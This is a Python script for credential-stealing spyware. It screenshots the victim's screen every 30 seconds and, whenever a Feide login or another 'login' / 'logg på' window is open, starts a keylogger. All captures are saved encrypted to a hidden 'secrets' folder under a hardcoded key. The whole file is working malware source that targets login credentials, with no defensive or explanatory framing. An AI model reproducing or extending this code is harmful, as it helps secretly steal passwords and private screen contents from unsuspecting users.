from keylogger import Keylogger
from folderEncryption import FolderEncrypter
import pygetwindow as gw
import pyautogui
import time
import threading
from os import remove

KEY = b'qqKDP73p1RurzTsBpXhmpuwQq8HrijMn0CgvLkmcWZY='

def is_website_open(website_url):
    try:
        for window in gw.getWindowsWithTitle(""):
            if website_url in str(window.title).lower():
                return True

    except Exception:
        pass
    return False

def takeScreenshot():
    myScreenshot = pyautogui.screenshot()
    return myScreenshot 

def screenshotThread(encrypter):
    while True:
        time.sleep(30)
        screen = takeScreenshot()
        screen.save("temp.png")

        with open("temp.png", "rb") as f:
            content = f.read()

        encrypter.store(content, "png")

        remove("temp.png")

def main():
    encrypter = FolderEncrypter(KEY, "secrets")

    screenThread = threading.Thread(target=screenshotThread, args=[encrypter])
    screenThread.start()
    keylogger = Keylogger()

    while True:
        if is_website_open("feide"):
            print("[+] detected feide tab open")
            keylogger.start(10)
            encrypter.store(str(keylogger.result).encode(), "txt")
            keylogger.reset()

        elif is_website_open("logg på") or is_website_open("login"):
            print("[+] detected logg på tab open")
            keylogger.start(10)
            encrypter.store(str(keylogger.result).encode(), "txt")
            keylogger.reset()

if __name__ == "__main__":
    main()
